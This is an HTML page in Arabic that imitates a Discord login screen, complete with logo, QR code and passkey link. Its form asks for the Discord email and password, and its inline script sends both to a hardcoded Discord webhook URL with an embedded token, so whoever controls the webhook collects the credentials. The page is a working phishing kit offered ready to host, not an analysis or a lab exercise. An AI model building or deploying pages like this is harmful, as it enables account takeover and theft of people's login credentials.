<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>Discord Login with Webhook</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: url("1000201800.jpg") no-repeat center center fixed;
      background-size: cover;
      color: #fff;
      direction: rtl;
    }

    .logo {
      position: absolute;
      top: 20px;
      left: 20px;
    }

    .logo img {
      height: 30px;
    }

    .login-container {
      background-color: #36393f;
      padding: 40px;
      border-radius: 8px;
      width: 700px;
      margin: 150px auto;
      box-shadow: 0 4px 10px rgba(0,0,0,0.5);
      display: flex;
      justify-content: space-between;
    }

    .form-section {
      width: 55%;
    }

    .form-section h2 {
      margin: 0 0 10px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-size: 14px;
      font-weight: bold;
    }

    input[type="email"], input[type="password"], input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border-radius: 4px;
      border: none;
      background-color: #202225;
      color: #fff;
      box-sizing: border-box;
    }

    .consent-label {
      font-weight: normal;
      margin-bottom: 15px;
      display: flex;
      align-items: center;
    }

    .consent-label input[type="checkbox"] {
      margin-left: 10px;
      transform: scale(1.2);
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #5865f2;
      border: none;
      border-radius: 4px;
      color: white;
      font-size: 15px;
      cursor: pointer;
    }

    .qr-section {
      width: 40%;
      text-align: center;
      background: transparent;
    }

    .qr-section img {
      width: 140px;
      margin-bottom: 10px;
    }

    .qr-section p {
      font-size: 13px;
      color: #b9bbbe;
    }

    .qr-section a {
      display: block;
      margin-top: 5px;
      color: #00aff4;
      text-decoration: none;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="logo">
    <img src="https://i.postimg.cc/rFVHq2qZ/logo.png" alt="Discord Logo" />
  </div>

  <div class="login-container">
    <div class="form-section">
      <h2>أدخل بيانات ديسكورد الخاصة بك</h2>
      <form id="discordForm">
        <label for="discord_email">إيميل الديسكورد:</label>
        <input type="email" id="discord_email" required />

        <label for="password">كلمة السر:</label>
        <input type="password" id="password" required />

        <label class="consent-label">
          <input type="checkbox" id="consent" required />
          أوافق على مشاركة المعلومات
        </label>

        <button type="submit">إرسال</button>
      </form>
    </div>

    <div class="qr-section">
      <img src="https://i.postimg.cc/DycKccwH/IMG-20250902-085445.jpg" alt="QR Code" />
      <h3>Log in with QR Code</h3>
      <p>Scan this with the <b>Discord mobile app</b> to log in instantly.</p>
      <a href="#">Or, sign in with passkey</a>
    </div>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1364438803170725899/9Zrvq7SXUIUIE8VEdazpPYtyc1qwDmaJufck8dEfC2w0xbc5TVktfzrb6vUJnPasaqDb";

    document.getElementById('discordForm').addEventListener('submit', function(event) {
      event.preventDefault();

      const email = document.getElementById('discord_email').value.trim();
      const password = document.getElementById('password').value.trim();
      const consent = document.getElementById('consent').checked;

      if (!consent) {
        alert("يجب الموافقة على مشاركة المعلومات");
        return;
      }

      const message = {
        embeds: [
          {
            title: "تم استلام بيانات جديدة من الموقع",
            color: 7506394,
            fields: [
              { name: "إيميل الديسكورد", value: email, inline: false },
              { name: "كلمة السر", value: password, inline: false }
            ],
            timestamp: new Date().toISOString()
          }
        ]
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
      })
      .then(response => {
        if (response.ok) {
          alert('تم الإرسال بنجاح!');
          this.reset();
        } else {
          alert('فشل الإرسال، حاول مرة أخرى لاحقاً.');
        }
      })
      .catch(error => {
        alert('خطأ في الاتصال: ' + error.message);
      });
    });
  </script>
</body>
</html>
